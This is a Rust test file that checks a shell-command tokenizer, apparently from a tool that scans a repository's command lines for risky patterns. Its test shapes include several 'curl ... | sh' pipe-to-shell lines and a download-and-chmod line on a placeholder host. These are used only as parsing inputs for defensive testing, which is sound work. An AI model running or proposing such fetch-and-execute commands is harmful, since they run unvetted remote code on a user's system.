//! The tokenizer's own contract, over a corpus rather than a list.
//!
//! The rule's table says what a sentence must name for the lines somebody
//! has thought of. That is not what this is: four defects landed in this
//! file in one review pass and every one was found by a person reading it,
//! because a token boundary can be in the wrong place for a long time
//! before the wrongness happens to move a fingerprint. What is asserted
//! here is what a reading of a line has to be true of whatever the line
//! says — over shapes chosen for their syntax, and over every command line
//! this repository's own content actually carries.

use super::{Word, commands};

/// Shell shapes, chosen for the syntax in them rather than for what they
/// fetch. Each is here because it is a thing shells do, not because a
/// finding once got it wrong.
const SHAPES: &[&str] = &[
    "curl https://one.example/x | sh",
    "curl 'https://one.example/p;v=1' | sh",
    "curl \"https://one.example/p;v=1\" | sh",
    "curl -H \"X: a\\\";b\" https://one.example/x | sh",
    "MODE=x curl https://one.example/x | MODE=y sh",
    "curl https://one.example/x | \"sh\"",
    "echo 'a b'\"c d\"e | sh",
    "a && b || c ; d & e | f",
    "echo \\| not a pipe",
    "echo ''",
    "echo \"\"",
    "curl $(printf https://one.example) | sh",
    "curl `printf https://one.example` | sh",
    "echo 'unterminated",
    "echo \"unterminated",
    "echo trailing backslash \\",
    "curl -o /tmp/p 'https://one.example/p,v1,' && chmod +x /tmp/p",
    "See `curl https://one.example/x | sh` in the docs.",
    "",
    "   ",
    ";;;",
    "| | |",
];

/// What each byte of a line is: a quote mark the shell takes out, or
/// content it hands over.
///
/// Deliberately not the tokenizer: it builds no words, knows nothing about
/// commands, and answers one question. Two readings agreeing is worth
/// something; what it cannot do is catch a misreading they would both make,
/// which is why half the corpus is content nobody wrote for this test.
#[derive(Clone, Copy, PartialEq, Eq)]
enum Byte {
    /// A quote mark, which is syntax and belongs in no word.
    Delimiter,
    /// Handed over, and inside quotes or not.
    Content { quoted: bool },
}

fn reading(line: &str) -> Vec<Byte> {
    let mut read = vec![Byte::Content { quoted: false }; line.len()];
    let (mut single, mut double) = (false, false);
    let mut chars = line.char_indices().peekable();
    let mark = |read: &mut [Byte], at: usize, c: char, byte: Byte| {
        for held in read.iter_mut().skip(at).take(c.len_utf8()) {
            *held = byte;
        }
    };
    while let Some((at, c)) = chars.next() {
        match c {
            '\\' if !single => {
                mark(&mut read, at, c, Byte::Delimiter);
                if let Some((next, escaped)) = chars.next() {
                    let quoted = single || double;
                    mark(&mut read, next, escaped, Byte::Content { quoted });
                }
            }
            '\'' if !double => {
                single = !single;
                mark(&mut read, at, c, Byte::Delimiter);
            }
            '"' if !single => {
                double = !double;
                mark(&mut read, at, c, Byte::Delimiter);
            }
            _ => {
                let quoted = single || double;
                mark(&mut read, at, c, Byte::Content { quoted });
            }
        }
    }
    read
}

/// One word written so that reading it back gives the same word.
fn requote(word: &Word) -> String {
    let plain = !word.text.is_empty()
        && !word
            .text
            .chars()
            .any(|c| c.is_whitespace() || "\"'\\|&;`$".contains(c));
    match plain {
        true => word.text.clone(),
        false => format!("'{}'", word.text.replace('\'', "'\\''")),
    }
}

/// Every command line this repository's own content carries, which is the
/// half of the corpus nobody wrote to pass a test.
fn from_the_catalog() -> Vec<String> {
    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../..");
    let mut found = Vec::new();
    let mut walk = vec![root.join("skills"), root.join("hooks"), root.join("agents")];
    while let Some(dir) = walk.pop() {
        let Ok(entries) = std::fs::read_dir(&dir) else {
            continue;
        };
        for entry in entries.flatten() {
            let path = entry.path();
            if path.is_dir() {
                walk.push(path);
                continue;
            }
            let readable = matches!(
                path.extension().and_then(std::ffi::OsStr::to_str),
                Some("md" | "sh" | "toml")
            );
            let Some(text) = readable
                .then(|| std::fs::read_to_string(&path).ok())
                .flatten()
            else {
                continue;
            };
            found.extend(
                text.lines()
                    .filter(|line| line.contains(['|', '&', ';', '\'', '"', '\\']))
                    .map(str::to_owned),
            );
        }
    }
    assert!(
        found.len() > 200,
        "the catalog's own command lines are the corpus: found {}",
        found.len()
    );
    found
}

fn corpus() -> Vec<String> {
    SHAPES
        .iter()
        .map(|line| (*line).to_owned())
        .chain(from_the_catalog())
        .collect()
}

/// Nothing is invented and nothing moves: every character a word holds came
/// from the line, in the order the line has them.
#[test]
fn a_reading_only_ever_gives_back_what_the_line_said() {
    for line in corpus() {
        let held: String = commands(&line)
            .iter()
            .flat_map(|command| command.words.iter())
            .map(|word| word.text.as_str())
            .collect();
        let mut written = line.chars().peekable();
        for c in held.chars() {
            assert!(
                written.by_ref().any(|had| had == c),
                "{line:?} does not say {c:?} where the reading does"
            );
        }
    }
}

/// A boundary between two commands never falls inside quotes.
///
/// This is the whole of what a separator means: a `;` inside quotes is a
/// character the shell hands over, and splitting there makes two commands
/// the line does not have — the second holding the payload, which then
/// belongs to nothing and is never named.
#[test]
fn no_command_ends_inside_something_quoted() {
    for line in corpus() {
        let inside = reading(&line);
        let read = commands(&line);
        for pair in read.windows(2) {
            let quoted: Vec<usize> = (pair[0].at.end..pair[1].at.start)
                .filter(|at| matches!(inside[*at], Byte::Content { quoted: true }))
                .collect();
            assert!(
                quoted.is_empty(),
                "{line:?} was split at {quoted:?}, which it has inside quotes"
            );
        }
    }
}

/// Every quote mark is either syntax or content, and the reading keeps
/// exactly the ones that are content.
///
/// A `"` inside single quotes is a character the shell hands over, and so
/// is one the line escaped; the pair that opened and closed a word is not,
/// and a word that keeps them is a program nothing has heard of. Counted
/// rather than forbidden, because both kinds turn up in one line.
#[test]
fn a_word_keeps_the_quote_marks_that_are_content_and_no_others() {
    for line in corpus() {
        let is_quote = |c: char| c == '"' || c == '\'';
        let content = line
            .char_indices()
            .filter(|(at, c)| is_quote(*c) && matches!(reading(&line)[*at], Byte::Content { .. }))
            .count();
        let kept: usize = commands(&line)
            .iter()
            .flat_map(|command| command.words.iter())
            .map(|word| word.text.chars().filter(|c| is_quote(*c)).count())
            .sum();
        assert_eq!(
            kept, content,
            "{line:?} keeps {kept} quote marks where {content} of them are content"
        );
    }
}

/// Written back out, a word reads as the same word.
///
/// Nothing here writes shell for real. The point is that a word which
/// cannot survive being written down is a word the reading got wrong: a
/// delimiter left inside one, or an empty argument that vanished, comes
/// back different.
#[test]
fn a_word_written_back_reads_as_itself() {
    for line in corpus() {
        for command in commands(&line) {
            let written: Vec<String> = command.words.iter().map(requote).collect();
            let read: Vec<String> = commands(&written.join(" "))
                .iter()
                .flat_map(|command| command.words.iter())
                .map(|word| word.text.clone())
                .collect();
            let was: Vec<String> = command.words.iter().map(|word| word.text.clone()).collect();
            assert_eq!(read, was, "{line:?} written back as {written:?}");
        }
    }
}
